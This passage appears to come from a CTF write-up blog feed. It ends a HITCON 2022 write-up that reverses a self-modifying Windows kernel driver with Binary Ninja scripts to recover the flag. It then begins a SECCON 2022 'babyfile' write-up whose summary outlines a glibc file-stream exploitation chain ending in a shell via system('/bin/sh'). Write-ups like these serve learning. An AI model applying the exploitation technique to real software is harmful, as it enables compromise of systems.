class="number">0x140013180</span>)</span><br><span class="line">patch_vaddr_instructions(proccbk_addr, <span class="number">0x140013188</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /!\ Very important when messing around with the Binary Ninja API /!\</span></span><br><span class="line">bv.commit_undo_actions()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done&quot;</span>)</span><br></pre></td></tr></table></figure><p>Wanna see a magic trick ? Go inside the <code>myterious_bunch_of_xors</code> function :</p><p><img src="/hitcon2022/Untitled%2020.png" alt="Untitled"></p><p>Now run the script and watch all these indirections just…</p><p><img src="/hitcon2022/Untitled%2021.png" alt="Untitled"></p><p>… huh ? Oh no ! Binary Ninja’s optimisations automatically replace the bytes from the <code>dec</code> function by their value, despite them being changed at runtime.</p><p>I went on Binary Ninja’s official Slack and the very same day I’m writing this, a guy had the same problem :</p><p><img src="/hitcon2022/Untitled%2022.png" alt="Untitled"></p><p>There was some nice answers, like this one :</p><p><img src="/hitcon2022/Untitled%2023.png" alt="Untitled"></p><p>The only real solution was this :</p><p><img src="/hitcon2022/Untitled%2024.png" alt="Untitled"></p><p>I’ve tried several but with no success. I asked how to do it, I’m still without answers :&#x2F;</p><p>We’re going to have to make this “virtual address unraveling” for all for of them, except <code>dec</code>. Let’s comment this out :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># patch_vaddr_instructions(proccbk_addr + 0x700, 0x140013180)</span></span><br></pre></td></tr></table></figure><p>So we’ll have to stick to</p><p><img src="/hitcon2022/Untitled%2025.png" alt="Untitled"></p><p>And</p><p><img src="/hitcon2022/Untitled%2026.png" alt="Untitled"></p><p>This. It could be better.</p><p>Since it seems to be used as an array of XOR keys in <code>myterious_bunch_of_xors</code>, let’s change <code>data_140003030</code> to <code>uint8_t key_array[0x100]</code>. Why <code>0x100</code> ? I just selected everything from <code>0x140003030</code> to the next data label and BInja kindly display the size of the selection in bytes at the bottom right corner :</p><p><img src="/hitcon2022/Untitled%2027.png" alt="Untitled"></p><p>So it seems that the driver is self-modifying. The only way it’s able to achieve this without triggering a fault is by setting the bit 16 of the <code>CR0</code> register to <code>0</code> in <code>sub_140001490</code> et re-setting it to <code>1</code> later in <code>sub_1400014b0</code>:</p><p><img src="/hitcon2022/Untitled%2028.png" alt="Untitled"></p><p>What this achieves is that <a href="https://en.wikipedia.org/wiki/Control_register#CR0">it allows code running in ring 0 to write to read-only pages</a>. So let’s call these two functions <code>DisableWP</code> and <code>EnableWP</code>.</p><h2 id="Actually-solving-the-challenge"><a href="#Actually-solving-the-challenge" class="headerlink" title="Actually solving the challenge"></a>Actually solving the challenge</h2><p>Back into <code>myterious_bunch_of_xors</code>. The function takes an <code>int32_t</code> as argument that seems to be the offset in <code>key_array</code> from which we’ll XOR the <code>dec</code> function, and, by looking at the code in the switch cases of <code>DispatchXXX</code> this argument can only be one of <code>[0x00, 0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0xe0]</code>, depending on the value of the IRP that was sent. At this moment, I just made the educated guess that the IRPs must be sent in a specific order to keep the <code>dec</code> coherent.</p><p>Let’s write a function to do the decryption.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /!\ Very important when messing around with the Binary Ninja API /!\</span></span><br><span class="line">bv.begin_undo_actions()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get those addresses.</span></span><br><span class="line">dec_addr = bv.get_symbol_by_raw_name(<span class="string">&quot;dec&quot;</span>).address</span><br><span class="line">proccbk_addr = bv.get_symbol_by_raw_name(<span class="string">&quot;PreProcCallback&quot;</span>).address</span><br><span class="line">key_array_addr = bv.get_symbol_by_raw_name(<span class="string">&quot;key_array&quot;</span>).address</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disassemble and lift to LLIL.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disass</span>(<span class="params">buf</span>):</span><br><span class="line">    new_bv = binaryview.BinaryView.new(buf)</span><br><span class="line">    new_bv.add_function(<span class="number">0</span>, plat=bv.platform)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,</span><br><span class="line">        new_bv.get_function_at(<span class="number">0</span>).low_level_il.instructions))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do what `DriverEntry` does on `dec`, basically.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_initial_decryption</span>():</span><br><span class="line">    buf = Transform[<span class="string">&#x27;XOR&#x27;</span>].encode(bv.read(dec_addr, <span class="number">16</span>), &#123;<span class="string">&#x27;key&#x27;</span>: bv.read(proccbk_addr, <span class="number">16</span>)&#125;)</span><br><span class="line">    buf = Transform[<span class="string">&#x27;XOR&#x27;</span>].encode(buf, &#123;<span class="string">&#x27;key&#x27;</span>: bv.read(proccbk_addr + <span class="number">16</span>, <span class="number">16</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do what the first and last do in `myterious_bunch_of_xors`.</span></span><br><span class="line"><span class="comment"># But only the start (or only the end, depending on the offset).</span></span><br><span class="line"><span class="comment"># (The last part is the same as the first but with `offset := offset + 16`.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_decrypt</span>(<span class="params">buf, offset</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(buf) == <span class="number">16</span>)</span><br><span class="line">    buf = Transform[<span class="string">&#x27;XOR&#x27;</span>].encode(buf,</span><br><span class="line">        &#123;<span class="string">&#x27;key&#x27;</span> : bv.read(key_array_addr + offset, <span class="number">16</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">dec = do_initial_decryption()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="number">0x20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Offset &quot;</span> + <span class="built_in">hex</span>(offset),</span><br><span class="line">        disass(do_decrypt(dec, offset)),</span><br><span class="line">        sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /!\ Very important when messing around with the Binary Ninja API /!\</span></span><br><span class="line">bv.commit_undo_actions()</span><br></pre></td></tr></table></figure><p>This script produces this output :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">Offset <span class="number">0x0</span></span><br><span class="line">temp0.d = ecx</span><br><span class="line">ecx = eax</span><br><span class="line">eax = temp0.d</span><br><span class="line">ebp = (rdi + <span class="number">0x2e988591</span>).d</span><br><span class="line"><span class="keyword">if</span> (flag:s != flag:o) then <span class="number">5</span> <span class="keyword">else</span> <span class="number">6</span> @ <span class="number">0x9</span></span><br><span class="line">jump(<span class="number">0x3c</span>)</span><br><span class="line">temp0.d = [rcx - <span class="number">0x6d2d9af5</span>].d</span><br><span class="line">[rcx - <span class="number">0x6d2d9af5</span>].d = edi</span><br><span class="line">edi = temp0.d</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x20</span></span><br><span class="line">rax = pop</span><br><span class="line">st0 = st0 f* <span class="built_in">float</span>.t([rcx + <span class="number">0x499be7f0</span>].d)</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">not</span>(flag:z) &amp;&amp; flag:s == flag:o) then <span class="number">3</span> <span class="keyword">else</span> <span class="number">4</span> @ <span class="number">0xd</span></span><br><span class="line">jump(<span class="number">0x6e858a3d</span>)</span><br><span class="line">edx = edx ^ eax</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x40</span></span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x60</span></span><br><span class="line">push(rcx)</span><br><span class="line">eax = sbb.d(eax, -<span class="number">0x61b75970</span>, flag:c)</span><br><span class="line">rbx = pop</span><br><span class="line">jump(<span class="number">0x1a1b5d87</span>)</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x80</span></span><br><span class="line">temp0.b = bl</span><br><span class="line">bl = bl u&gt;&gt; cl</span><br><span class="line">flag:c = unimplemented</span><br><span class="line">[ffffffffaa687d9a].d = sbb.d([ffffffffaa687d9a].d, edx, flag:c)</span><br><span class="line">r13 = r13 + rdi</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0xa0</span></span><br><span class="line">esi = edi * <span class="number">0x2fcf7038</span></span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0xc0</span></span><br><span class="line">al = sbb.b(al, <span class="number">0x40</span>, flag:c)</span><br><span class="line">temp0.d = ecx</span><br><span class="line">ecx = eax</span><br><span class="line">eax = temp0.d</span><br><span class="line">temp0.b = [rsp + (rax &lt;&lt; <span class="number">1</span>) + <span class="number">0x252aff20</span>].b</span><br><span class="line">[rsp + (rax &lt;&lt; <span class="number">1</span>) + <span class="number">0x252aff20</span>].b = al</span><br><span class="line">al = temp0.b</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0xe0</span></span><br><span class="line">edx = zx.d(cl)</span><br><span class="line">eax = edx</span><br><span class="line">dl = dl &lt;&lt; <span class="number">3</span></span><br><span class="line">eax = eax u&gt;&gt; <span class="number">5</span></span><br><span class="line">al = al | dl</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line">==========</span><br></pre></td></tr></table></figure><p>None of these routines makes sens… except the last one !</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edx = zx.d(cl)</span><br><span class="line">eax = edx</span><br><span class="line">dl = dl &lt;&lt; <span class="number">3</span></span><br><span class="line">eax = eax u&gt;&gt; <span class="number">5</span></span><br><span class="line">al = al | dl</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br></pre></td></tr></table></figure><p>It takes the first argument <code>cl</code> and basically returns <code>cl &lt;&lt; 3 | cl &gt;&gt; 5</code>. That’s right ! The guess is confirmed !</p><p>Let’s just add</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offsets = []</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0xe0</span> ]</span><br><span class="line"><span class="comment"># Do the first and last part of `myterious_bunch_of_xors`</span></span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>right before the <code>for</code> loop and run the script again :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Offset <span class="number">0x0</span></span><br><span class="line">temp2.d = edx</span><br><span class="line">temp3.d = eax</span><br><span class="line">temp0.d = divs.dp.d(temp2.d:temp3.d, [rcx - <span class="number">0x4c</span>].d)</span><br><span class="line">temp4.d = edx</span><br><span class="line">temp5.d = eax</span><br><span class="line">temp1.d = mods.dp.d(temp4.d:temp5.d, [rcx - <span class="number">0x4c</span>].d)</span><br><span class="line">eax = temp0.d</span><br><span class="line">edx = temp1.d</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x20</span></span><br><span class="line">__out_immb_oeax(<span class="number">0xa0</span>, eax, rflags.d)</span><br><span class="line">rdi = pop</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x40</span></span><br><span class="line">cl = cl ^ <span class="number">0x26</span></span><br><span class="line">eax = zx.d(cl)</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x60</span></span><br><span class="line">__out_dx_al(dx, al, rflags.d)</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0x80</span></span><br><span class="line">temp0, rdi = __insd(rdi, dx, rflags.d)</span><br><span class="line">[rdi].d = temp0.d</span><br><span class="line">temp0.d = ecx</span><br><span class="line">ecx = eax</span><br><span class="line">eax = temp0.d</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0xa0</span></span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0xc0</span></span><br><span class="line">[8df7fc620fa3473a].d = eax</span><br><span class="line">dl = sbb.b(dl, [r10].b, flag:c)</span><br><span class="line">rip = __int1()</span><br><span class="line">push(rax)</span><br><span class="line">rbp = pop</span><br><span class="line">undefined</span><br><span class="line">==========</span><br><span class="line">Offset <span class="number">0xe0</span></span><br><span class="line">al = <span class="number">0xcc</span></span><br><span class="line">undefined</span><br><span class="line">==========</span><br></pre></td></tr></table></figure><p>Now only the routine decrypted with the switch case <code>0x20</code> (offset <code>0x40</code>) makes sens !</p><p>Let’s repeat this process and at the end we have</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">offsets += [ <span class="number">0xe0</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0x40</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0xc0</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0x00</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0x20</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0x80</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0x60</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">offsets += [ <span class="number">0xa0</span> ]</span><br><span class="line">dec = do_decrypt(do_decrypt(dec, offsets[-<span class="number">1</span>]), offsets[-<span class="number">1</span>] + <span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># No decryption make sens after this ...</span></span><br></pre></td></tr></table></figure><p>Which yields the following <code>dec</code> routines :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Offset 0xe0</span></span><br><span class="line">edx = zx.d(cl)</span><br><span class="line">eax = edx</span><br><span class="line">dl = dl &lt;&lt; <span class="number">3</span></span><br><span class="line">eax = eax u&gt;&gt; <span class="number">5</span></span><br><span class="line">al = al | dl</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x40</span></span><br><span class="line">cl = cl ^ <span class="number">0x26</span></span><br><span class="line">eax = zx.d(cl)</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0xc0</span></span><br><span class="line">edx = zx.d(cl)</span><br><span class="line">eax = edx</span><br><span class="line">dl = dl &lt;&lt; <span class="number">4</span></span><br><span class="line">eax = eax u&gt;&gt; <span class="number">4</span></span><br><span class="line">al = al | dl</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x0</span></span><br><span class="line">eax = (rcx + <span class="number">0x37</span>).d</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x20</span></span><br><span class="line">eax = (rcx + <span class="number">0x7b</span>).d</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x80</span></span><br><span class="line">edx = zx.d(cl)</span><br><span class="line">eax = edx</span><br><span class="line">dl = dl &lt;&lt; <span class="number">7</span></span><br><span class="line">eax = eax u&gt;&gt; <span class="number">1</span></span><br><span class="line">al = al | dl</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x60</span></span><br><span class="line">eax = zx.d(cl)</span><br><span class="line">eax = eax * <span class="number">0xad</span></span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0xa0</span></span><br><span class="line">edx = zx.d(cl)</span><br><span class="line">eax = edx</span><br><span class="line">dl = dl &lt;&lt; <span class="number">2</span></span><br><span class="line">eax = eax u&gt;&gt; <span class="number">6</span></span><br><span class="line">al = al | dl</span><br><span class="line">&lt;<span class="keyword">return</span>&gt; jump(pop)</span><br></pre></td></tr></table></figure><p>Let’s flag this then :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">c</span>):</span><br><span class="line">    c = ((c &lt;&lt; <span class="number">3</span>) | (c &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    c = c ^ <span class="number">0x26</span></span><br><span class="line">    c = ((c &lt;&lt; <span class="number">4</span>) | (c &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    c = (c + <span class="number">0x37</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    c = (c + <span class="number">0x7b</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    c = ((c &lt;&lt; <span class="number">7</span>) | (c &gt;&gt; <span class="number">1</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    c = (c * <span class="number">0xad</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    c = ((c &lt;&lt; <span class="number">2</span>) | (c &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">enc_flag = bv.get_data_var_at(bv.get_symbol_by_raw_name(<span class="string">&quot;flag&quot;</span>).address)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> c: <span class="built_in">chr</span>(dec(c)), enc_flag.value))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>:3</p><p><img src="/hitcon2022/Untitled%2029.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> hitcon-2022 </tag>
            
            <tag> reverse-engineering </tag>
            
            <tag> windows-kernel </tag>
            
            <tag> static-analysis </tag>
            
            <tag> metamorphic </tag>
            
            <tag> driver </tag>
            
            <tag> binaryninja </tag>
            
            <tag> 0poss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SECCON CTF 2022 Quals] babyfile</title>
      <link href="/2022/08/19/babyfile/"/>
      <url>/2022/08/19/babyfile/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>babyfile is a file stream exploitation I did during the <a href="https://ctftime.org/event/1764">SECCON CTF 2022 Quals</a> event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution – I have not seen before – based on <code>_IO_obstack_jumps</code>! The related files can be found <a href="https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile">here</a>. If you’re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially <a href="../catastrophe">this one</a> and <a href="../filestream">this other one</a>.</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li>Populate base buffer with heap addresses with the help of <code>_IO_file_doallocate</code>.</li><li>Make both input and output buffer equal to the base buffer with the help of <code>_IO_file_underflow</code>.</li><li>Partial overwrite on right pointers to get a libc leak by simply flushing the file stream.</li><li>Leak a heap address by printing a pointer stored within the main_arena.</li><li><code>_IO_obstack_overflow</code> ends up calling a function pointer stored within the file stream we have control over which leads to a call primitive (plus control over the first argument). Then I just called <code>system(&quot;/bin/sh\x00&quot;)</code>.</li></ul><span id="more"></span><h1 id="What-we-have"><a href="#What-we-have" class="headerlink" title="What we have"></a>What we have</h1><p>The challenge is basically opening <code>/dev/null</code>, asking for an offset and a value to write at <code>fp + offset</code>. And we can freely flush <code>fp</code>. The source code is prodided:</p><p>Source code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getnline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getint</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">write_str(<span class="string">&quot;Play with FILE structure\n&quot;</span>);</span><br><span 